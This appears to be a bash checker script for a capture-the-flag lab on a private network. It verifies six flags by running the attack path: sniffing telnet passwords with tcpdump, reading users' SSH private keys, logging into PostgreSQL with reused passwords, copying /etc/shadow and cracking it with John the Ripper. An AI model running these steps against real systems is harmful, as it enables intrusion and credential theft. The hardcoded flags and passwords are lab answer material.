#!/usr/bin/env bash

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

FLAG1="{flag1-internal-use-only}"
FLAG2="{flag2-L33T}"
FLAG3="{flag3-Sw0rdf1sh}"
FLAG4="{flag4-pr1v4tek3y}"
FLAG5="{flag5-y1k3s}"
FLAG6="{flag6-*hackervoice*imin}"

# Flag 1
echo "Flag #1: Dev password on internal website"

curl http://172.16.10.5/guides/newhire/ 2> /dev/null | grep "$FLAG1" > /dev/null

if [[ "$?" == "0" ]]; then
    echo "  [*] Able to read flag #1 from the internal docs site"
else
    echo "  [!] Unable to find flag #1 on the internal docs site!"
fi

# Flag 2
echo "Flag #2: Camera image"

curl http://172.16.10.224/feed.jpg -o /tmp/camera 2> /dev/null
diff /tmp/camera "$SCRIPT_DIR/../volumes/cameras/feed_2.jpg" > /dev/null

if [[ "$?" == "0" ]]; then
    echo "  [*] Able to retrieve \"camera\" feed with flag #2 (assuming that the image does indeed contain the flag)"
else
    echo "  [!] Could not find flag #2, or the image does not match the expected one"
fi

# Flag 3
echo "Flag #3: Alice's laptop"
echo "  [*] Waiting 30 seconds to hear password..."

packetdump=$(sshpass -p "letmein" ssh carol@172.16.10.4 timeout 30 tcpdump -A port telnet 2> /dev/null)
grep "$FLAG3" <<< "$packetdump" > /dev/null

if [[ "$?" == "0" ]]; then
    echo "  [*] Able to retrieve flag #3"
else
    echo "  [!] Could not find flag #3!"
fi

# Flag 4
echo "Flag #4: Private key files"

if [[ $(sshpass -p "$FLAG3" ssh alice@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Alice has incorrect flag #4"
elif [[ $(sshpass -p "{flag2-L33T}" ssh bob@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Bob has incorrect flag #4"
elif [[ $(sshpass -p "letmein" ssh carol@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Carol has incorrect flag #4"
else
    echo "  [*] Able to retrieve flag #4 from every user account"
fi

# Flag 5
echo "Flag #5: Postgresql database"

# PGPASSWORD="{flag1-internal-use-only}" psql -h 172.16.10.6 -U dev -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
# dev=$?
PGPASSWORD="$FLAG3" psql -h 172.16.10.6 -U alice -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
alice=$?
PGPASSWORD="{flag2-L33T}" psql -h 172.16.10.6 -U bob -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
bob=$?
PGPASSWORD="letmein" psql -h 172.16.10.6 -U carol -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
carol=$?

# if [[ "$dev" != "0" ]]; then
#     echo "  [!] Dev cannot access flag #5"
if [[ "$alice" != "0" ]]; then
    echo "  [!] Alice cannot access flag #5"
elif [[ "$bob" != "0" ]]; then
    echo "  [!] Bob cannot access flag #5"
elif [[ "$carol" != "0" ]]; then
    echo "  [!] Carol cannot access flag #5"
else
    echo "  [*] Able to read flag #5 from every user account"
fi

# Flag 6
echo "Flag #6: Carol brute-force"

sshpass -p "$FLAG3" scp alice@172.16.10.4:/etc/shadow .
rm ~/.john/john.pot 2> /dev/null
timeout 1 john --users=carol --wordlist=wordlist.lst shadow 2> /dev/null | grep letmein > /dev/null

if [[ "$?" != "0" ]]; then
    echo "  [!] Did not immidiately brute-force Carol's password"
else
    flag=$(sshpass -p "letmein" ssh carol@172.16.10.4 cat flag.txt)
    if [[ "$flag" != "$FLAG6" ]]; then
        echo "  [!] Unable to find the flag in Carol's home directory"
    else
        echo "  [*] Able to read the flag from Carol's home directory"
    fi
fi

rm ./shadow